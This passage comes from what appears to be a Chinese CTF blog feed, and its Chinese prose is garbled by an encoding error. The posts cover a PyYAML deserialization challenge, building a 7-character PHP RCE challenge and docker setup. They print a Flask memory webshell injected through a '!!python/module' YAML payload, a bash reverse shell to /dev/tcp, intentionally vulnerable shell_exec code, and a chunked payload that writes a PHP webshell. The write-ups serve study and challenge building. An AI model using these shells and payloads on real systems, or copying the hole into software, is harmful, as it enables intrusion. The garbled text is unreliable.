</span><br><span class="line">                <span class="keyword">else</span>:  </span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;È≤ÅËøÖËØ¥Ôºö‰Ω†ËØ¥Âæó‰∏çÂØπ&#x27;</span>)  </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;È≤ÅËøÖËØ¥Ôºö&#x27;</span>+<span class="built_in">str</span>(e))  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;view/jojo.yaml&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            sayings = yaml.load(f, Loader=Loader)  </span><br><span class="line">            saying = random.choice(sayings)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=saying)</span><br></pre></td></tr></table></figure><p>ÊàëÁ¨¨‰∏ÄÊ¨°ÂÅöPYyamlÂèçÂ∫èÂàóÂåñÔºåÂÖàÂ≠¶‰π†‰∏Ä‰∏ã</p><blockquote><p>yaml.dump()ÔºöÂ∞Ü‰∏Ä‰∏™PythonÂØπË±°Â∫èÂàóÂåñÁîüÊàê‰∏∫yamlÊñáÊ°£„ÄÇ<br>yaml.load()ÔºöÂ∞Ü‰∏Ä‰∏™yamlÊñáÊ°£ÂèçÂ∫èÂàóÂåñ‰∏∫‰∏Ä‰∏™PythonÂØπË±°„ÄÇ<br><strong>Ê£ÄÊµãÊñπÊ≥ï</strong>Ôºö<br>Python‰ª£Á†Å‰∏≠ÊòØÂê¶ÂåÖÂê´‚Äúimport yaml‚ÄùÔºåËã•ÂåÖÂê´ÂàôËøõ‰∏ÄÊ≠•ÊéíÊü•ÊòØÂê¶Ë∞ÉÁî®yaml.load()‰∏îÂèÇÊï∞ÊòØÂèØÊéßÁöÑ„ÄÇ<br><strong>Èò≤Âæ°ÊñπÊ≥ï</strong><br>‰ΩøÁî®ÂÆâÂÖ®ÂáΩÊï∞yaml.safe_load()Êõø‰ª£yaml.load()Âç≥ÂèØËß£ÂÜ≥PyyamlÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇ</p></blockquote><p>ÁÑ∂ÂêéÊòØÂà©Áî®yamlÊñá‰ª∂ËøõË°åÂëΩ‰ª§ÊâßË°åÔºå‰ΩÜÊòØËøô‰∏™È¢òpython‰∏≠ÁöÑÂëΩ‰ª§ÊâßË°åÂáΩÊï∞ÈÉΩÁªôban‰∫ÜÔºåÊâÄ‰ª•‰∏çËÉΩÁõ¥Êé•Âú®yamlËøõË°åÂëΩ‰ª§ÊâßË°åÔºå‰ΩÜÊòØÂèØ‰ª•ÈÄöËøáyamlÊù•ÂØºÂÖ•ÂÖ∂ÂÆÉÊ®°ÂùóÊù•ËøõË°åÂëΩ‰ª§ÊâßË°å<br>Êú¨È¢òÈÄöËøá<strong>python&#x2F;module</strong>Ê†áÁ≠æÊù•ÂÆûÁé∞ÔºåËøôÈáåÊúâ‰∏Ä‰∏™ÁÇπÂ∞±ÊòØ‰∏ä‰º†ÁöÑÊñá‰ª∂ÂíåÊâßË°åÁöÑÊñá‰ª∂‰∏çÂú®Âêå‰∏ÄÁõÆÂΩïÔºåÈÄöËøáÂá∫È¢ò‰∫∫ÁöÑwpÂèØÁü•ÁõÆÂΩïÂ±ÇÁ∫ß‰∏∫&#x2F;static&#x2F;upload&#x2F;‰∏ä‰º†ÁöÑÊñá‰ª∂ÔºåÂΩìÁÑ∂ÈÄöËøáÂâçÈù¢ÁöÑÊµãËØï‰πüÂèØÁåúÂá∫Êù•ÔºåËøô‰∏™Êó∂ÂÄôyamlÊñá‰ª∂ÂÜÖÂÆπÂ∞±ÂèØÂÜôÊàê<code>!!python/module:static.upload</code>Ôºå‰ªéËÄåÂä†ËΩΩÂëΩ‰ª§ÊâßË°åÁöÑÊ®°ÂùóÔºåËøôÊ†∑ÂÜô‰Ω†Ë¶ÅÂä†ËΩΩÁöÑÊ®°ÂùóÊñá‰ª∂ÂêçÂøÖÈ°ªÂëΩÂêç‰∏∫<code>__init__.py</code>Âê¶ÂàôÂ∞±Ë¶ÅÂú®yamlÊñá‰ª∂‰∏≠ÂÜôÂÖ•‰Ω†Ë¶ÅÂä†ËΩΩÁöÑÊ®°ÂùóÊñá‰ª∂Âêç<br><strong>ÂÖàÊää‰∏äÈù¢ÂÖ≥‰∫émoduleÊ†áÁ≠æÂà©Áî®ËøáÁ®ãËß£Èáä‰∏Ä‰∏ãÔºåÊÑüËßâÈÄªËæëÊúâ‰∫õÊ∑∑‰π±‰∫ÜÔºåËá™Â∑±Ê≤°Â§™ÁêÜËß£</strong></p><blockquote><p>ÂÅáÂ¶ÇÊúâ‰∏™yaml_test.pyÊñá‰ª∂‰∏∫<br><code>import os </code><br><code>os.system(&#39;mate-calc&#39;)</code><br>Âú®Âè¶‰∏ÄÊñá‰ª∂simple.py‰∏≠Ôºå‰æùÊ¨°ËøêË°å‰ª•‰∏ãload‰ª£Á†Å<br><code>import yaml </code><br><code>yaml.load(&quot;!!python/module:yaml_test&quot; )  </code>#expÊñπÊ≥ïÊòØÈöèÊÑèÂÜôÁöÑÔºåÊòØ‰∏çÂ≠òÂú®ÁöÑÔºå‰ΩÜÂøÖÈ°ªË¶ÅÊúâÔºåÂõ†‰∏∫ËøôÊòØÂëΩÂêçËßÑÂàôÔºå‰∏çÁÑ∂‰ºöÊä•ÈîôÔºå‰∏ªË¶ÅÊòØÊñá‰ª∂Âêçyaml_testË¶ÅÂÜôÂØπ<code>  </code>yaml.load(‚Äú!!python&#x2F;object:yaml_test.exp‚Äù )<br><code>yaml.load(&quot;!!python/name:yaml_test.exp&quot; )</code><br>ËøôÂá†Êù°ÂëΩ‰ª§ÈÉΩËÉΩÊâìÂºÄËÆ°ÁÆóÂô®ÔºåËøôÈáåÊàëËá™Â∑±Ê≤°ÂÅöÊµãËØïÔºåyamlÁâàÊú¨Â§ß‰∫é5.1Â∞±Ë¶ÅÂä†‰∏™LoaderÂèÇÊï∞Âê¶ÂàôÊâßË°åyaml.loadÂ∞±‰ºöÊä•Èîô</p></blockquote><p>‰∏äÈù¢ÊòØË¶ÅÊ±ÇÂêå‰∏ÄÁõÆÂΩïÔºå‰∏çÂú®Âêå‰∏ÄÁõÆÂΩïÂ∞±ÊòØÊú¨È¢òÊâÄÁî®ÊñπÊ≥ïÔºåÁ®çÂæÆÊîπ‰∏Ä‰∏ãyamlÊñá‰ª∂Êñá‰ª∂Â∞±Ë°åÔºåËøôÊ†∑Â∞±ÊØîËæÉÂ•ΩÁêÜËß£‰∏∫‰ªÄ‰πàÊûÑÈÄ†yamlÊñá‰ª∂Âíå__init__.pyÊñá‰ª∂‰∫Ü<br>Êé•‰∏ãÊù•Â∞±ÊòØÊûÑÈÄ†__init__.pyÊñá‰ª∂ËøõË°åÂëΩ‰ª§ÊâßË°åÔºåÂá∫È¢ò‰∫∫Ëá™Â∑±ÁöÑwp‰ΩøÁî®ÁöÑÂÜÖÂ≠òÈ©¨Êú¨‰∫∫ËøòÊ≤°Â§™‰∫ÜËß£ÊâÄ‰ª•Áõ¥Êé•Áî®Êù•Êâì‰∏Ä‰∏ãÔºåÂ∞±‰∏çËß£ÈáäÊûÑÈÄ†‰∫Ü</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *  </span><br><span class="line"><span class="built_in">eval</span>(  </span><br><span class="line">    <span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;)).read())&quot;</span>,  </span><br><span class="line">   &#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>: url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>], <span class="string">&#x27;app&#x27;</span>: url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)  </span><br><span class="line"><span class="comment"># ÁîüÊàê‰∏Ä‰∏™shellË∑ØÁî±ÔºåÂèÇÊï∞‰∏∫shell</span></span><br></pre></td></tr></table></figure><p>ÂÖàÂ∞Ü__init__.py‰º†ÂÖ•<br><img src="https://s1.ax1x.com/2022/12/27/zz0vcR.png" alt="zz0vcR.png"><br>ËøôÈáåË¶ÅÊ≥®ÊÑèÁöÑÊòØÂõæÁâá‰∏ä‰º†Ë∑ØÁî±Âú®‰∏ãÈù¢ËøôÈáåÔºåÊäìÊú¨Âú∞‰∏ä‰º†ÁöÑÈÇ£‰∏™ÂåÖÂ∞±Ë°åÔºåÂæàÂÇªÁöÑ‰∏Ä‰∏™ÈóÆÈ¢òËá™Â∑±Âú®ËøôÈáåÂç°‰∫ÜÂçäÂ§©ÔºåÂæóÊÑüË∞¢‰∏Ä‰∏ã<a href="https://www.lengf233.top/">lengf</a>Â∏àÂÇÖÁªôÊàëËß£Á≠îËøô‰πàÂÇªÁöÑÈóÆÈ¢ò<br><img src="https://s1.ax1x.com/2022/12/27/zz0xj1.png" alt="zz0xj1.png"><br>ÁÑ∂Âêé‰∏ä‰º†yamlÊñá‰ª∂<br><img src="https://s1.ax1x.com/2022/12/27/zz0X9J.png" alt="zz0X9J.png"><br>ÊúÄÂêéËÆøÈóÆ<code>blog/saying?path=static/upload/poc1.yaml</code>ÁîüÊàêË∑ØÁî±ÔºåËøõË°åÂëΩ‰ª§ÊâßË°å<br><img src="https://s1.ax1x.com/2022/12/27/zz0Lh4.png" alt="zz0Lh4.png"><br>Á¨¨‰∫å‰∏™ÊòØÂèçÂºπshellÔºåÊàëËøôÈáåÁî®ÁöÑbashÂèçÂºπ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/xxx/2333 0&gt;&amp;1&quot;&#x27;)</span><br></pre></td></tr></table></figure><p>ÊîæÂÖ•__init__.pyÁîüÊàêË∑ØÁî±Êó∂‰ºöÊâßË°åÔºåÂç≥ÂèØÂèçÂºπÊàêÂäü<br><img src="https://s1.ax1x.com/2022/12/27/zz0j39.png" alt="zz0j39.png"><br>ÊúâÊó∂Èó¥ÂÜçÊ≤âÊ∑Ä‰∏Ä‰∏ãÔºåÁêÜËß£ÁöÑ‰∏çÊòØÂæàÈÄèÂΩª<br>ÂèÇËÄÉÔºö<br><a href="https://pysnow.cn/archives/566/">Âá∫È¢ò‰∫∫</a><br><a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#pythonmodule">https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#pythonmodule</a><br><a href="https://www.cnblogs.com/damoxilai/p/16707055.html">https://www.cnblogs.com/damoxilai/p/16707055.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>7Â≠óÁ¨¶rceÈ¢òÁõÆÊê≠Âª∫</title>
      <link href="/2022/12/7%E5%AD%97%E7%AC%A6rce%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/"/>
      <url>/2022/12/7%E5%AD%97%E7%AC%A6rce%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p><strong>Êê≠Âª∫Ëøô‰∏™È¢òÁõÆÊú¨ÊÑèÂ∞±ÊòØÊÉ≥Â≠¶‰π†‰∏Ä‰∏ãdockerfileÂíådocker-compose.ymlÊñá‰ª∂ÁöÑ‰ΩøÁî®ÔºåÂéüÁêÜËÆ≤ÁöÑ‰∏çÈÄèÂΩªÔºå‰∏ªË¶ÅËÆ∞ÂΩï‰∏Ä‰∏ãÊìç‰Ωú</strong></p><p>È¶ñÂÖàÂú®Êú¨Âú∞ÊääËß£È¢òÁöÑÊ∫êÁ†ÅÂÜôÂÆåÔºåÂÜç‰∏ä‰º†Âà∞ÊúçÂä°Âô®<br><img src="https://s1.ax1x.com/2022/12/19/zLikCD.png" alt="zLikCD.png"><br>files‰∏ãÊîæÁöÑÊòØflag.phpÂíåindex.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])&lt;=<span class="number">7</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr/&gt;&#x27;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>if(strlen($_GET[1])&lt;=7)</code>ËøôÈáåÊàë‰∏ÄÂºÄÂßãÊµãËØïÁî®ÁöÑÂ∞è‰∫é8ÔºåÁÑ∂ÂêéËøôÈáåÊîπ‰∫Ü‰πüÊ≤°ÂÜçÊµãËØïÔºåÊÑèÊÄùÈÉΩ‰∏ÄÊ†∑ÔºåÁÑ∂ÂêéÁΩë‰∏äËøôÈáåÁî®ÁöÑÂ∞è‰∫é7ÔºåËøôÊ†∑ÁöÑËØù7Â≠óÁ¨¶Ê†πÊú¨Â∞±Ëøá‰∏ç‰∫Ü<br>Ë®ÄÂΩíÊ≠£‰º†ÔºåÊàë‰ª¨ÂÖàÁúã‰∏Ä‰∏ãdockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctftraining/base_image_nginx_mysql_php_73</span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> Author=<span class="string">&quot;JokerY&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> Blog=<span class="string">&quot;https://joker2763.github.io/&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files  /var/www/html  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><blockquote><p>FROMÂ∞±ÊòØÊãâÂèñ‰∏Ä‰∏™Âü∫Á°ÄÈïúÂÉè<br>LABELÂ∞±ÊòØÊâìÊ†áÁ≠æÔºåËØ¥Êòé‰ΩúËÄÖÁ≠â<br><code>ENV LANG C.UTF-8</code>Ëøô‰∏ÄÂè•Â∞±ÊòØ‰ΩøÁî®utf-8ÁºñÁ†ÅÔºåÈò≤Ê≠¢‰∏≠Êñá‰π±Á†ÅÔºåÂΩìÁÑ∂Âú®Ëøô‰∏™È¢òÊ≤°Êúâ‰∏≠Êñá<br>COPYËøôÈáåÂ∞±ÊòØÊääÊúçÂä°Âô®ÁöÑËß£È¢òÊâÄÈúÄÊñá‰ª∂ÊîæÂà∞dockerÂÆπÂô®ÈáåÈù¢<br>EXPOSEÊòØÊò†Â∞ÑÂà∞ÂÆø‰∏ªÊú∫ÁöÑÁ´ØÂè£ÔºåÂ∞±ÊòØÊö¥Èú≤ÂÆπÂô®80Á´ØÂè£</p></blockquote><p>ÁÑ∂ÂêéÁúã‰∏Ä‰∏ãdocker-compose.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">FLAG=flag&#123;This_is_flag&#125;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;2333:80&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>versionÊåáÊòéymlÊñá‰ª∂ÁöÑÁâàÊú¨Âè∑<br>servicesÂ∞±ÊòØymlÊñá‰ª∂ÁöÑ‰∏ª‰ΩìÔºåÂÆö‰πâ‰∫ÜÊúçÂä°‰∫ÜÈÖçÁΩÆ„ÄÇbulidÂ∞±ÊòØÂü∫‰∫édockerfileÂêØÂä®‰∏Ä‰∏™ÂÆπÂô®ÔºåÂêéÈù¢Â∞±ÊòØdockerfileË∑ØÂæÑÔºåËøôÈáå‰ª£Ë°®dockerfileÂíåyamlÊñá‰ª∂Âú®Âêå‰∏ÄË∑ØÂæÑÔºåenvironmentËøô‰∏™Â∞±ÊòØÂºÑÂä®ÊÄÅflagÔºåËøôÈáåÊàë‰ª•ÂêéÂæÄÂπ≥Âè∞‰∏äÈ¢òÂÜçÂ≠¶‰∏Ä‰∏ãÊìç‰ΩúÔºåportsËøôÈáå2333Ë°®Á§∫Êò†Â∞ÑÁöÑÁ´ØÂè£Ôºå80ËøôÈáåÂíådockerfileË¶Å‰∏ÄÊ†∑</p></blockquote><p>ËøôÊ†∑‰∏Ä‰∏™È¢òÁõÆÊê≠Âª∫Â∞±Âü∫Êú¨ÂÆåÊàê‰∫ÜÔºåÁÑ∂ÂêéÂÜçÂéªÊúçÂä°Âô®ËøêË°ådocker-compose.ymlÊñá‰ª∂Â∞±ÂèØ‰ª•Âø´ÈÄüÊê≠Âª∫È¢òÁõÆ‰∫Ü<br><img src="https://s1.ax1x.com/2022/12/19/zLieKA.png" alt="zLieKA.png"><br>ÂèØ‰ª•ÁúãÂà∞Áõ¥Êé•ÊâßË°å<code>sudo  docker-compose up -d</code>Â∞±ÂèØ‰ª•Âø´ÈÄüËµ∑‰∏Ä‰∏™ÁéØÂ¢ÉÔºåËÄå‰∏îËøôÈáåÂàõÂª∫‰∫Ü‰∏Ä‰∏™rce-web-1ÈïúÂÉèÔºåÂπ∂‰∏îËøôÈáåÁúãÂà∞ÂÆπÂô®ÂàõÂª∫ÊàêÂäü<br>ËÆøÈóÆ‰∏Ä‰∏ãÔºåÁúãÂà∞È¢òÁõÆ<br><img src="https://s1.ax1x.com/2022/12/19/zLiVvd.png" alt="zLiVvd.png"><br>Êâì‰∏Ä‰∏ã<br>payloadÔºö</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp  </span><br><span class="line">&gt;1.p\\  </span><br><span class="line">&gt;d\&gt;\\  </span><br><span class="line">&gt;\ -\\  </span><br><span class="line">&gt;e64\\  </span><br><span class="line">&gt;bas\\  </span><br><span class="line">&gt;7\|\\  </span><br><span class="line">&gt;XSk\\  </span><br><span class="line">&gt;Fsx\\  </span><br><span class="line">&gt;dFV\\  </span><br><span class="line">&gt;kX0\\  </span><br><span class="line">&gt;bCg\\  </span><br><span class="line">&gt;XZh\\  </span><br><span class="line">&gt;AgZ\\  </span><br><span class="line">&gt;waH\\  </span><br><span class="line">&gt;PD9\\  </span><br><span class="line">&gt;o\ \\  </span><br><span class="line">&gt;ech\\  </span><br><span class="line">ls -t&gt;0  </span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><p>ËøôÈáåÂèØ‰ª•‰ΩøÁî®ËÑöÊú¨Ëá™Âä®ÊâßË°åÔºå‰ΩÜÊòØÁΩë‰∏äËÑöÊú¨ÊàëÊâßË°åÂèëÁé∞‰∏ÄÂè•ËØùÂÜô‰∏çËøõÂéªÔºåÂèØËÉΩÂì™ÈáåÊúâÁÇπÈóÆÈ¢ò<br>Áõ¥Êé•ÊâãÂä®Âêß<br>ÊàêÂäüÂÜôÂÖ•<br><img src="https://s1.ax1x.com/2022/12/19/zLiA8e.png" alt="zLiA8e.png"><br>ÊãøÂà∞flagÔºåËøôÈáå‰πüÂ∞±ÊòØflag.phpÁöÑ‰ª£Á†Å<br><img src="https://s1.ax1x.com/2022/12/19/zLii4O.png" alt="zLii4O.png"><br>‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πàËöÅÂâëËøû‰∏ç‰∏äÔºåÂèØËÉΩÊòØÊàëÁéØÂ¢ÉÊúâÈóÆÈ¢òÔºå‰ª•ÂêéÊê≠Âª∫Êñá‰ª∂‰∏ä‰º†ÁöÑÈ¢òÁõÆÂÜçÁªÜÁªÜÁ†îÁ©∂‰∏Ä‰∏ã</p>]]></content>
      
      
      <categories>
          
          <category> Doker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Â≠¶‰π†Êê≠Âª∫‰∏Ä‰∏™ÁÆÄÂçïÈ¢ò</title>
      <link href="/2022/12/%E5%AD%A6%E4%B9%A0%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E9%A2%98/"/>
      <url>/2022/12/%E5%AD%A6%E4%B9%A0%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h2><p>ÂÖ≥‰∫éÁî®dockerÂá∫È¢òÁöÑÊñáÁ´†ÂÆûÂú®ÊòØÂ§™Â∞ë‰∫ÜÔºåÊâÄ‰ª•Ëá™Â∑±Âú®Â≠¶‰π†ÁöÑÊó∂ÂÄôËÆ∞ÂΩï‰∏Ä‰∏ã<br>dockerÁöÑ‰∏Ä‰∫õÂü∫Êú¨Êê≠Âª∫Âú®ËøôÈáåÂ∞±‰∏ç‰∏Ä‰∏ÄËØ¥Êòé‰∫ÜÔºåËøôÈáåÂè™ËÆ∞ÂΩï‰∏Ä‰∏ãÂ¶Ç‰ΩïÊää‰∏Ä‰∏™È¢òÁõÆÂºÑÂá∫Êù•ÔºåÂèØËÉΩÊúâ‰∫õÂú∞Êñπ‰πüÊúâÈîôËØØ</p><h2 id="ËøõÂÖ•‰∏ªÈ¢ò"><a href="#ËøõÂÖ•‰∏ªÈ¢ò" class="headerlink" title="ËøõÂÖ•‰∏ªÈ¢ò"></a>ËøõÂÖ•‰∏ªÈ¢ò</h2><p>ÊåâÊàëËá™Â∑±ÁöÑÁêÜËß£Â∞±ÊòØÂÖàÊãâÂèñ‰∏Ä‰∏™ÈïúÂÉèÁî®Êù•Â∏ÉÁΩÆÈ¢òÁõÆÊâÄÈúÄÁöÑÁéØÂ¢É‰ª•ÂèäÂÆπÂô®ÊâÄÈúÄ<br>ÊàëËøôÈáå‰ΩøÁî®<code>ctftraining/base_image_nginx_mysql_php_73</code> Ëøô‰∏™ÈïúÂÉè‰∏ÄÂºÄÂßãÊàëÁî®ÁöÑ<code>tutum/lamp</code><br>‰ΩÜÊòØÂèëÁé∞Ëøô‰∏™ÈïúÂÉèÊúâÁÇπÈóÆÈ¢ò‰∏çËÉΩÊòæÁ§∫‰∏≠ÊñáÔºåÂèØËÉΩÊòØdockerfileÊ≤°ËÆæÁΩÆ<br>ÊãâÂèñÈïúÂÉè<code>docker pull ctftraining/base_image_nginx_mysql_php_73 </code><br>ËøôÈáåÊàëÂ∑≤ÁªèÊãâÂèñ‰∫ÜÔºåÊâÄ‰ª•Âàó‰∏Ä‰∏ã<br><img src="https://s1.ax1x.com/2022/12/15/zo0fQs.png" alt="zo0fQs.png"><br>ÁÑ∂Âêé‰ΩøÁî®ctftraining&#x2F;base_image_nginx_mysql_php_73ÈïúÂÉèÂêØÂä®‰∏Ä‰∏™ÂÆπÂô®ÔºåÂêåÊó∂Êò†Â∞ÑÂà∞ÊúçÂä°Âô®ÁöÑ2333Á´ØÂè£<br><code> docker run -d -p 2333:80 ctftraining/base_image_nginx_mysql_php_73</code><br><img src="https://s1.ax1x.com/2022/12/15/zo0Rzj.png" alt="zo0Rzj.png"><br>ÂèØ‰ª•ÁúãÂà∞Â∑≤ÁªèÂêØÂä®‰∫Ü‰∏Ä‰∏™ÂÆπÂô®ÔºåÁÑ∂ÂêéÂ∞±ÊòØÂºÑÂá∫È¢òÊñá‰ª∂‰∫ÜÔºåÂÖà‰∏ä‰º†Âà∞ÊúçÂä°Âô®ÁöÑ&#x2F;var&#x2F;www&#x2F;html‰∏ã<br>‰∏Ä‰∏™ÁÆÄÂçïÁöÑÊäìÂåÖÊü•ÁúãÊ∫êÁ†ÅÁöÑÈ¢òÔºåÂõ†‰∏∫‰∏ªË¶ÅÊòØÂ≠¶‰π†ÊÄé‰πàÂ∏ÉÁΩÆ‰∏Ä‰∏™È¢òÁõÆÔºåÊâÄ‰ª•Áõ¥Êé•Âà∞ÁΩë‰∏äÊâæÁöÑ‰∏Ä‰∏™Ê∫êÁ†Å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;p style=<span class="string">&quot;font-family:arial;color:black;font-size:20px;text-align:center;&quot;</span>&gt;Flag‰∏çÂú®ËøôÈáåÂì¶&lt;/p&gt;  </span><br><span class="line">&lt;!-- flag&#123;This_is_flag&#125; --&gt;  </span><br><span class="line">&lt;/body&gt;  </span><br><span class="line">&lt;script&gt;  </span><br><span class="line"> document.oncontextmenu=<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">   <span class="title function_ invoke__">alert</span>(<span class="string">&quot;Âè≥ÈîÆË¢´Á¶ÅÁî®&quot;</span>);  </span><br><span class="line">   <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">  &#125;;  </span><br><span class="line"> document.onkeydown = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;  </span><br><span class="line">    e = window.event || e;  </span><br><span class="line">    <span class="keyword">var</span> k = e.keyCode;  </span><br><span class="line">    <span class="comment">//Â±èËîΩctrl+uÔºåF12ÈîÆ  </span></span><br><span class="line">    <span class="keyword">if</span> ((e.ctrlKey == <span class="literal">true</span> &amp;&amp; k == <span class="number">85</span>) || k == <span class="number">123</span>) &#123;  </span><br><span class="line">      <span class="keyword">if</span> (k == <span class="number">85</span>)  </span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&quot;Ctrl+UË¢´Á¶ÅÁî®!&quot;</span>);  </span><br><span class="line">      <span class="keyword">else</span>   </span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&quot;F12Ë¢´Á¶ÅÁî®!&quot;</span>);  </span><br><span class="line">      e.keyCode = <span class="number">0</span>;  </span><br><span class="line">      e.returnValue = <span class="literal">false</span>;  </span><br><span class="line">      e.cancelBubble = <span class="literal">true</span>;  </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> &#125;  </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÊääÈ¢òÁõÆÁöÑÊ∫êÁ†Å‰ªéÊúçÂä°Âô®copyÂà∞ÂÆπÂô®‰∏≠<br><code>docker cp /var/www/html/index.php 